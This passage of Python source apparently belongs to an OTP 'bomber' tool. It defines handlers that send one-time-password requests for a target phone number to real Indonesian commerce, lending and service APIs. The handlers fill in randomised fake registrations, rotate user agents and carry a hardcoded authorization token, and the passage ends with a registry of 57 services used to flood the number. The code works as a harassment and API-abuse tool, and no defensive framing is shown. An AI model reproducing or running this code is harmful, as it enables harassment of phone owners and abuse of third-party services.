        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 52. RUPARUPA
def send_ruparupa_otp(phone):
    try:
        url = "https://wapi.ruparupa.com/auth/generate-otp"
        payload = {"phone": fmt_08(phone), "action": "register", "channel": "chat", "email": "", "token": "", "customer_id": "0", "is_resend": 0}
        headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# 53. ADAKAMI
def send_adakami_otp(phone):
    try:
        phone_local = fmt_08(phone)
        url = "https://api.adakami.id/adaKredit/pesan/kodeVerifikasi"
        payload = {"ketik": 0, "nomor": phone_local}
        headers = {'Content-Type': 'application/json', 'User-Agent': 'okhttp/3.8.0', 'accept-language': 'in'}
        resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
        if resp and resp.status_code < 400:
            return True, resp.status_code, 'OK'
        return False, resp.status_code if resp else None, ''
    except:
        return False, None, ''

# ==================== ORIGINAL HANDLERS ====================

# 54. HRS-BRE
def send_hrsbre_otp(phone):
    phone_08 = fmt_08(phone)
    url = "https://career.hrs-bre.site/auth/sign_up_action"
    nik = ''.join(random.choices(string.digits, k=16))
    email = ''.join(random.choices(string.ascii_lowercase, k=8)) + "@gmail.com"
    username = ''.join(random.choices(string.ascii_letters, k=8))
    password = 'Aa1' + ''.join(random.choices(string.ascii_letters + string.digits + "#$%&!", k=7))
    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"nik\"\r\n\r\n{nik}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n{email}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"whatsapp\"\r\n\r\n{phone_08}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"username\"\r\n\r\n{username}\r\n"
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\n{password}\r\n"
        f"--{boundary}--\r\n"
    )
    headers = {'Content-Type': f'multipart/form-data; boundary={boundary}', 'User-Agent': get_random_user_agent()}
    resp = safe_request('POST', url, headers=headers, data=body, timeout=15)
    if resp and resp.status_code < 400:
        return True, resp.status_code, 'OK'
    return False, resp.status_code if resp else None, ''

# 55. ERAFONE
def send_erafone_otp(phone):
    url = "https://jeanne.eraspace.com/customers/v2.1/otp/request"
    payload = {"identifier": fmt_plus(phone), "type": "identifier_validation"}
    headers = {'Content-Type': 'application/json', 'Authorization': 'Basic Y3VzdGJhc2ljOk9MV2llWlVvQlA=', 'otp-provider': 'whatsapp', 'User-Agent': get_random_user_agent()}
    resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
    if resp and resp.status_code == 200:
        return True, 200, 'OK'
    return False, resp.status_code if resp else None, ''

# 56. PLANETBAN
def send_planetban_otp(phone):
    url = "https://api.planetban.com/website/customer/request-otp"
    payload = {"name": "Test", "phone": fmt_08(phone), "password": "Test123", "purpose": "register", "method": "whatsapp"}
    headers = {'Content-Type': 'application/json', 'User-Agent': get_random_user_agent()}
    resp = safe_request('POST', url, headers=headers, json=payload, timeout=15)
    if resp and resp.status_code < 400:
        return True, resp.status_code, 'OK'
    return False, resp.status_code if resp else None, ''

# 57. TUNEUP
def send_tuneup_otp(phone):
    url = "https://api.tuneup.id/v1/mitra/register/send-otp"
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    data = {
        'company_name': f'PT {name.capitalize()}',
        'owner_name': name.capitalize(),
        'address': ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        'email': f'{name}@mailnesia.com',
        'phone_number': fmt_08(phone),
        'province_code': '32',
        'city_code': '32.04',
        'subscription_id': 'undefined',
        'channel': 'whatsapp',
        'agreement': 'true',
        'service_categories[]': '3'
    }
    headers = {'User-Agent': get_random_user_agent()}
    resp = safe_request('POST', url, headers=headers, data=data, timeout=15)
    if resp and resp.status_code < 400:
        return True, resp.status_code, 'OK'
    return False, resp.status_code if resp else None, ''

# ==================== ALL HANDLERS ====================
ALL_HANDLERS = {
    'tokopedia': send_tokopedia_otp,
    'thaifriendly': send_thaifriendly_otp,
    'shopee': send_shopee_otp,
    'ktbs': send_ktbs_otp,
    'klikwa': send_klikwa_otp,
    'payfaz': send_payfaz_otp,
    'securedapi': send_securedapi_otp,
    'matahari': send_matahari_otp,
    'battlefront': send_battlefront_otp,
    'pinjamindo': send_pinjamindo_otp,
    'jumpstart': send_jumpstart_otp,
    'asani': send_asani_otp,
    'depop': send_depop_otp,
    'klikindomaret': send_klikindomaret_otp,
    'qtva': send_qtva_otp,
    'danacita': send_danacita_otp,
    'kredito': send_kredito_otp,
    'maucash': send_maucash_otp,
    'gojek': send_gojek_otp,
    'harvestcake': send_harvestcake_otp,
    'oyo': send_oyo_otp,
    'foreignadmits': send_foreignadmits_otp,
    'sayurbox': send_sayurbox_otp,
    'tokko': send_tokko_otp,
    'carsome': send_carsome_otp,
    'jenius': send_jenius_otp,
    'alodokter': send_alodokter_otp,
    'pizzahut': send_pizzahut_otp,
    'misteraladin': send_misteraladin_otp,
    'icq': send_icq_otp,
    'cairin': send_cairin_otp,
    'mapclub': send_mapclub_otp,
    'bukuwarung': send_bukuwarung_otp,
    'rupiahcepat': send_rupiahcepat_otp,
    'adiraku': send_adiraku_otp,
    'singa': send_singa_otp,
    'pinhome': send_pinhome_otp,
    'duniagames': send_duniagames_otp,
    'acc': send_acc_otp,
    'absenku': send_absenku_otp,
    'saturdays': send_saturdays_otp,
    'maulagi': send_maulagi_otp,
    'halodoc': send_halodoc_otp,
    'blibli': send_blibli_otp,
    'dekoruma': send_dekoruma_otp,
    'olx': send_olx_otp,
    'indihome': send_indihome_otp,
    'tokomanamana': send_tokomanamana_otp,
    'jadgreward': send_jadgreward_otp,
    'ginee': send_ginee_otp,
    'beryllium': send_beryllium_otp,
    'ruparupa': send_ruparupa_otp,
    'adakami': send_adakami_otp,
    'hrsbre': send_hrsbre_otp,
    'erafone': send_erafone_otp,
    'planetban': send_planetban_otp,
    'tuneup': send_tuneup_otp,
}

def get_all_handlers():
    return ALL_HANDLERS

def get_handler(name):
    return ALL_HANDLERS.get(name)
